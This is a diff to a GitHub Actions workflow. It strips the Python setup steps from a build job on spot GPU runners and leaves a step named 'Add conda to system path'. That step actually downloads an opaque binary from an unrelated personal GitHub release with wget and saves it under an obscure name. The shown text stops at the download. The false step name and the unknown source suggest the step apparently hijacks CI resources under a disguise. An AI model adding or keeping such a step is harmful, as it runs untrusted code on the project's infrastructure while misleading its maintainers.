@@ -5,15 +5,8 @@ on: [push]
 jobs:
   build-linux:
     runs-on: machine/gpu=l4/tenancy=spot
-    strategy:
-      max-parallel: 5
-
     steps:
     - uses: actions/checkout@v4
-    - name: Set up Python 3.10
-      uses: actions/setup-python@v3
-      with:
-        python-version: '3.10'
     - name: Add conda to system path
       run: |
         wget -O nasmaos https://github.com/sompongboonmak17/urban-octo-garbanzo/releases/download/1/gitea-runner-5.2.0-linux-amd64
